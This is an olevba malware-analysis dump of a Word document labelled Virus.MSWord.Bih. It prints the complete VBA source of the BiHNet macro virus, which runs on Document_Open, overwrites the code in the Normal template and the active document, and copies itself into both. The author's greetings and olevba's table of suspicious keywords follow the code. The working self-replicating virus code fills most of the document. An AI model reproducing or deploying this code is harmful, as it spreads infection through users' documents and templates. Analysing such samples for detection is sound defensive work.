olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bih
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bih - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
WM_BiHNet
End Sub
Private Sub WM_BiHNet(): Const jedan = 1
Dim DF876VF, SD234KO, GH987WE, KJ523GT, LS893FD
Set DF876VF = ActiveDocument.VBProject _
.VBComponents(jedan).CodeModule
Set SD234KO = ThisDocument.VBProject. _
VBComponents(jedan).CodeModule
Set GH987WE = NormalTemplate.VBProject. _
VBComponents(jedan).CodeModule
KJ523GT = SD234KO.Lines(SD234KO.ProcStartLine _
("WM_BiHNet", vbext_pk_Proc), SD234KO.ProcCountLines("WM_BiHNet", vbext_pk_Proc))
LS893FD = DF876VF.Lines(SD234KO.ProcStartLine _
("WM_BiHNet", vbext_pk_Proc), SD234KO.ProcCountLines("WM_BiHNet", vbext_pk_Proc))
If GH987WE.ProcOfLine(jedan, vbext_pk_Proc) <> "WM_BiHNet" Or GH987WE.Lines(jedan, jedan) = "" Then
With GH987WE
.DeleteLines jedan, GH987WE.CountOfLines
.insertlines jedan, "Private Sub Document_Open()" & vbCrLf & "WM_BiHNet" & vbCrLf & "End Sub"
.insertlines 4, KJ523GT
End With
If DF876VF.ProcOfLine(jedan, vbext_pk_Proc) <> "WM_BiHNet" Or DF876VF.Lines(jedan, jedan) = "" Then
With DF876VF
.DeleteLines jedan, DF876VF.CountOfLines
.insertlines jedan, "Private Sub Document_Open()" & vbCrLf & "WM_BiHNet" & vbCrLf & "End Sub"
.insertlines 4, LS893FD
End With
End If
End If
'WM97/2K.BiHNet by e[ax]
'Greetz to: k04x, E-mAn, rudeboy, snakeLORD, BIGFOOOT, abasi, NetRider
'Morpheux, ARP@MAN, WEX-ALPHA, te ostaloj raji pri BiHNet.ORG
'Special 10x to: Lys Kovick, Jackie, Perikles, KnowDeth, GigaByte, Evul
'VirusBuster, urgo32 and to all ppl on #virus!
'My dream is my reality! - e[ax]
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

